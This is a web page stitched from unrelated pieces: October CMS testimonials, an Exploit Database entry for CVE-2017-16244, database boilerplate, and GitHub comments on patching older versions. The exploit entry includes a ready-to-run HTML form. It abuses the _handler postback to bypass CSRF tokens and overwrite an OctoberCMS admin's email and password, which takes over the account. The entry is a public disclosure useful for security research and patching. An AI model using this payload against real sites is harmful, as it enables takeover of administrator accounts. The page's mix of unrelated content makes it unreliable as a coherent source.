The most important thing in October CMS is the core which uses Laravel. That is a great combination. The LTS release is stable, we found it very important. We like the marketplace with one of the largest plugins directories that allows installing the desired plugin in a few clicks directly from the Administration Area or the command line.

Ivan Gorokhov
Developer @
[Mobecan](https://mobecan.com/),

October CMS paired with the Shopaholic ecosystem allows handling enormous datasets. It took just two weeks to implement an API integration between a Client's website and a supplier and upload 180K of products to the website, updating them weekly. Key benefits of using October CMS compared to pure Laravel are a flexible Administration Area and the availability of many third-party extensions that allow us to save time and money.

Our team started using October CMS two years ago. We were looking for a CMS based on Laravel that would simplify and accelerate developing clients’ web solutions. It was love at first sight! The CMS is built on the familiar Laravel architecture. It allows us to build virtually any business logic for our clients. The clients like it too, thanks to the user-friendly back-end. Today October is the only CMS that we use for developing new PHP projects.

# OctoberCMS 1.0.426 (Build 426) - Cross-Site Request Forgery

# Exploit Title: OctoberCMS 1.0.426 - CSRF to Admin Account Takover
# Vendor Homepage: https://octobercms.com
# Software Link: https://octobercms.com/download
# Exploit Author: Zain Sabahat
# Website: https://about.me/ZainSabahat
# Category: webapps
# CVE: CVE-2017-16244

1. Description

Cross-Site Request Forgery exists in OctoberCMS 1.0.426 (aka Build 426) due to improper validation of CSRF Tokens for postback handling, allowing an attacker to successfully take over the victim's account.
The vendor was using additional X-CSRF Headers and CSRF Token to prevent the CSRF from occurring.The researcher found a way to bypass this protection.After digging more in the Application he found a postback variable "_handler=" which could be used to perform CSRF without X-Headers.The CSRF Tokens were also not being validated when _handler parameter was used to make the request.
In short, this attack bypasses a protection mechanism involving X-CSRF headers and CSRF tokens via a certain _handler postback variable.

https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-16244
https://vuldb.com/?id.108857

2. Proof of Concept
 Below is the CSRF Exploit (.html) which can lead to the takeover of the Admin's Account upon successful execution.

<html>
  <body>
    <form action="http://host/backend/users/myaccount" method="POST">
      <input type="hidden" name="&#95;handler" value="onSave" />
      <input type="hidden" name="User&#91;login&#93;" value="Admin" />
      <input type="hidden" name="User&#91;email&#93;" value="Hacked&#64;hacked&#46;com" />
      <input type="hidden" name="User&#91;first&#95;name&#93;" value="Admin" />
      <input type="hidden" name="User&#91;last&#95;name&#93;" value="1337" />
      <input type="hidden" name="User&#91;password&#93;" value="YourNewPassword" />
      <input type="hidden" name="User&#91;password&#95;confirmation&#93;" value="YourNewPassword" />
      <input type="hidden" name="redirect" value="0" />
      <input type="submit" value="Submit request" />
    </form>
  </body>
</html>

Upon execution of this CSRF, the Admin Account details will be replaced by ours leading to complete hijacking of Admin Account.

   https://vuldb.com/?id.108857

4. Solution

The vulnerability will be patched by the vendor in the next release of OctoberCMS.Following changes should be made for a temporary fix (https://github.com/octobercms/october/commit/4a6e0e1e0e2c3facebc17e0db38c5b4d4cb05bd0).

##### About The Exploit Database

×

[![OffSec](/images/offsec-logo.png)](https://www.offsec.com/)
The Exploit Database is maintained by [OffSec](https://www.offsec.com/community-projects/), an information security training company
that provides various [Information Security Certifications](https://www.offsec.com/courses-and-certifications/) as well as high end [penetration testing](https://www.offsec.com/penetration-testing/) services. The Exploit Database is a
non-profit project that is provided as a public service by OffSec.

The Exploit Database is a [CVE
compliant](http://cve.mitre.org/data/refs/refmap/source-EXPLOIT-DB.html) archive of public exploits and corresponding vulnerable software,
developed for use by penetration testers and vulnerability researchers. Our aim is to serve
the most comprehensive collection of exploits gathered through direct submissions, mailing
lists, as well as other public sources, and present them in a freely-available and
easy-to-navigate database. The Exploit Database is a repository for exploits and
proof-of-concepts rather than advisories, making it a valuable resource for those who need
actionable data right away.

The [Google Hacking Database (GHDB)](/google-hacking-database)
is a categorized index of Internet search engine queries designed to uncover interesting,
and usually sensitive, information made publicly available on the Internet. In most cases,
this information was never meant to be made public but due to any number of factors this
information was linked in a web document that was crawled by a search engine that
subsequently followed that link and indexed the sensitive information.

The process known as “Google Hacking” was popularized in 2000 by Johnny
Long, a professional hacker, who began cataloging these queries in a database known as the
Google Hacking Database. His initial efforts were amplified by countless hours of community
member effort, documented in the book Google Hacking For Penetration Testers and popularised
by a barrage of media attention and Johnny’s talks on the subject such as this early talk
recorded at [DEFCON 13](https://www.defcon.org/html/links/dc-archives/dc-13-archive.html). Johnny coined the term “Googledork” to refer
to “a foolish or inept person as revealed by Google“. This was meant to draw attention to
the fact that this was not a “Google problem” but rather the result of an often
unintentional misconfiguration on the part of a user or a program installed by the user.
Over time, the term “dork” became shorthand for a search query that located sensitive
information and “dorks” were included with may web application vulnerability releases to
show examples of vulnerable web sites.

After nearly a decade of hard work by the community, Johnny turned the GHDB
over to [OffSec](https://www.offsec.com/community-projects/) in November 2010, and it is now maintained as
an extension of the [Exploit Database](/). Today, the GHDB includes searches for
other online search engines such as [Bing](https://www.bing.com/),
and other online repositories like [GitHub](https://github.com/),
producing different, yet equally valuable results.

I can confirm that it has mitigated the CSRF vulnerability for postback handling.

Sorry, something went wrong.

[@daftspunk](https://github.com/daftspunk) and [@ZainSabahat](https://github.com/ZainSabahat)

Is it safe to assume that the CSRF vulnerability was present in most versions prior to build 426 as well?

Just seeking clarification that version 419 and earlier ,that cannot be upgraded due to PHP versions, need to be manually patched?

[@ARH-Digital](https://github.com/ARH-Digital) That would be correct, although you should really update your environments to use more modern versions of PHP to stay up to date with all of the security fixes, performance improvements, general bug fixes, and features to come. A host that provides >= PHP7 is not expensive, there is rarely a good reason to stick with <7, especially when factoring in the performance improvements in 7

Thank you for the confirmation. I totally agree with the hosting. However, I work for an agency and we do offer hosting, but alas, we cannot control the environments of all our clients, and are restricted in some instances.

Let your clients know what they risk by not upgrading versions and perhaps provide them options for better hosts that will upgrade if their current one refuses to.
